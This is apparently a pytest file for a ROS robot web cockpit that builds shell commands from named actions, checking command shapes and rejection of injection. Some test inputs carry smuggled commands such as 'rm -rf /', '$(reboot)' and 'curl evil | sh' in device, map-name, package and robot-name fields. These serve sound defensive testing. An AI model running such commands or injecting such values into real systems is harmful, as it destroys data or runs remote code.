"""The named actions build the right command and refuse unsafe arguments.

The point of the module is that the browser can no longer put shell text on the
wire: it names an action and sends data, and the server builds the command. So
the tests that matter are (1) the command comes out shaped right, and (2) an
argument carrying shell metacharacters is rejected, not quoted-and-run.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "web", "backend"))

import actions  # noqa: E402


def test_agent_start_native_serial():
    cmd = actions.build("agent_start", {"engine": "native", "transport": "serial",
                                        "device": "/dev/ttyUSB0", "baud": 921600, "distro": "jazzy"})
    assert "micro_ros_agent serial --dev /dev/ttyUSB0 -b 921600" in cmd
    assert "source" in cmd  # ROS sourcing prepended


def test_agent_start_udp_has_no_device():
    cmd = actions.build("agent_start", {"engine": "native", "transport": "udp4", "port": 8888})
    assert "udp4 -p 8888" in cmd
    assert "--dev" not in cmd


def test_bringup_is_the_launch_one_click_runs():
    """The browser pointed at launch_bringup.py beside web/, a file never shipped
    here, so every browser Bringup failed (ros2 read the path as a package)."""
    cmd = actions.build("bringup", {"config_path": "/c/robot.yaml", "micro_ros": False,
                                    "distro": "jazzy"})
    assert "ros2 launch linorobot2_cockpit bringup.launch.py" in cmd
    assert "config_file:=/c/robot.yaml" in cmd and "micro_ros:=false" in cmd
    assert "launch_bringup.py" not in cmd
    # The board fuses its own orientation; there is no filter node to switch on.
    assert "madgwick" not in cmd


def test_teleop_writes_params_and_runs():
    cmd = actions.build("teleop", {"axis_linear": 1, "scale_linear": 0.5,
                                   "axis_angular": 0, "scale_angular": 1.0})
    assert "teleop_twist_joy_node" in cmd and "joy_linux_node" in cmd


def test_map_save_name_is_an_identifier():
    cmd = actions.build("map_save", {"name": "kitchen", "maps_dir": "/w/maps"})
    assert "map_saver_cli -f /w/maps/kitchen" in cmd


def test_apt_install_quotes_a_package_list():
    cmd = actions.build("apt_install", {"packages": "ros-jazzy-slam-toolbox ros-jazzy-nav2-bringup"})
    assert "apt-get install -y ros-jazzy-slam-toolbox ros-jazzy-nav2-bringup" in cmd


def test_unknown_action_raises():
    with pytest.raises(ValueError):
        actions.build("rm_rf_slash", {})


@pytest.mark.parametrize("bad", [
    {"device": "/dev/ttyUSB0; rm -rf /"},
    {"device": "/dev/tty$(reboot)"},
    {"device": "/dev/tty\nreboot"},
])
def test_shell_metacharacters_in_device_are_refused(bad):
    args = {"engine": "native", "transport": "serial", "baud": 921600}
    args.update(bad)
    with pytest.raises(ValueError):
        actions.build("agent_start", args)


def test_a_bad_map_name_is_refused_not_quoted():
    with pytest.raises(ValueError):
        actions.build("map_save", {"name": "x; reboot", "maps_dir": "/w/maps"})


def test_apt_rejects_a_non_package_token():
    with pytest.raises(ValueError):
        actions.build("apt_install", {"packages": "good-pkg; curl evil | sh"})


def test_prepared_handles_are_one_shot():
    h = actions.prepare("echo hello")
    assert actions.claim(h) == "echo hello"
    assert actions.claim(h) is None
    assert actions.claim("bogus") is None


def test_slam_and_nav2_are_the_launches_one_click_runs():
    slam = actions.build("slam", {"distro": "jazzy", "config_path": "/c/robot.yaml"})
    assert "ros2 launch linorobot2_cockpit slam.launch.py config_file:=/c/robot.yaml" in slam
    nav = actions.build("nav2", {"distro": "jazzy", "config_path": "/c/robot.yaml",
                                 "map": "/m/kitchen.yaml"})
    assert "ros2 launch linorobot2_cockpit nav2.launch.py autostart:=true" in nav
    assert "config_file:=/c/robot.yaml" in nav and "map:=/m/kitchen.yaml" in nav
    for cmd in (slam, nav):
        assert "launch_nav2.py" not in cmd and "linorobot2_navigation" not in cmd


def test_laser_driver_serial():
    cmd = actions.build("laser_driver", {"is_ld": True, "mode": "serial", "product": "LDLiDAR_LD19",
                                         "bins": 456, "port": "/dev/ttyUSB0", "baud": 230400})
    assert "ldlidar_stl_ros2_node --ros-args" in cmd
    assert "-p comm_mode:=serial" in cmd and "-p port_name:=/dev/ttyUSB0" in cmd


def test_laser_driver_udp_bridge_reclaims_pty_without_pkill_f():
    cmd = actions.build("laser_driver", {"is_ld": True, "mode": "udp_bridge", "bins": 456,
                                         "udp_port": 8889, "bridge_path": "/dev/lidar_udp_bridge"})
    assert "socat" in cmd
    assert "pkill -f" not in cmd            # AGENTS.md Rule 1 -- fixed in the port
    assert "[s]ocat" in cmd                 # bracketed pgrep instead


def test_laser_driver_non_ld_uses_lasers_launch():
    cmd = actions.build("laser_driver", {"is_ld": False, "code": "rplidar_a1", "distro": "jazzy"})
    assert "lasers.launch.py sensor:=rplidar_a1" in cmd


def test_rviz_novnc_never_uses_pkill():
    cmd = actions.build("rviz_novnc", {"display": ":99", "novnc_port": 6080})
    assert "pkill" not in cmd and "Xvfb :99" in cmd


def test_rviz_novnc_installs_rviz2_before_running_it():
    """The robot image has the rviz libraries but not the rviz2 executable.

    rviz_common, rviz_default_plugins, rviz_rendering, rviz_ogre_vendor and
    nav2_rviz_plugins all arrive as dependencies of the stack, which makes the
    image look like it has RViz. It does not: `command -v rviz2` on a stock
    image with ROS sourced answers nothing. The action guarded Xvfb, x11vnc and
    websockify and not the one binary the whole feature is for, so it ran three
    apt installs and then died on command-not-found.
    """
    cmd = actions.build("rviz_novnc", {"display": ":99", "novnc_port": 6080})
    assert "ros-$ROS_DISTRO-rviz2" in cmd
    # and the install must come before the run, or the guard buys nothing
    assert cmd.index("ros-$ROS_DISTRO-rviz2") < cmd.index("DISPLAY=:99")
    # a failed install must stop, not launch a viewer that cannot exist
    assert "rviz2 is not installed and could not be installed" in cmd


def test_docker_down_builds_compose():
    cmd = actions.build("docker_down", {"engine": "docker", "docker_dir": "/w/docker"})
    assert 'COMPOSE="docker compose"' in cmd and "cd /w/docker" in cmd and "down" in cmd


def test_docker_build_assembles_env_and_compose():
    cmd = actions.build("docker_build", {"distro": "jazzy", "base_image": "linorobot2:jazzy",
                                         "robot_base": "2wd", "serial_port": "/dev/ttyACM0",
                                         "workspace": "/w", "docker_dir": "/w/docker",
                                         "robot_name": "robbie", "engine": "docker"})
    assert "git clone" in cmd and "linorobot2" in cmd
    assert "cat > /w/docker/.env" in cmd and "ROBOT_NAME=robbie" in cmd
    assert "$COMPOSE" in cmd and "build" in cmd


def test_docker_build_rejects_a_bad_robot_name():
    with pytest.raises(ValueError):
        actions.build("docker_build", {"base_image": "img", "robot_name": "a; rm -rf /",
                                       "workspace": "/w", "docker_dir": "/w/d"})


def test_rviz_novnc_gives_rviz_the_display():
    """`DISPLAY=:99 [ -f cfg ] && rviz2 -d cfg || rviz2` set DISPLAY for the `[`
    test only: rviz2 aborted with no display and noVNC showed black."""
    cmd = actions.build("rviz_novnc", {"display": ":99", "novnc_port": 6080,
                                       "rviz_config": "/ws/rviz/slam.rviz"})
    assert "export DISPLAY=:99" in cmd
    assert cmd.index("export DISPLAY=:99") < cmd.index("rviz2 -d")
    assert "[ -S /tmp/.X11-unix/X99 ]" in cmd, "wait for the display to exist"


def test_the_rviz_web_viewer_runs_beside_slam_and_navigation():
    """It shared the "main" slot with SLAM and Navigation, so it could only be
    started when there was nothing to look at."""
    import os
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    core = open(os.path.join(root, "web", "backend", "core.py")).read()
    assert '"viewer": viewer_runner' in core
    js = open(os.path.join(root, "web", "frontend", "app-nav-viz.js")).read()
    block = js[js.index('action: "rviz_novnc"'):]
    assert 'slot: "viewer"' in block[:600] and 'killSlot("viewer")' in js
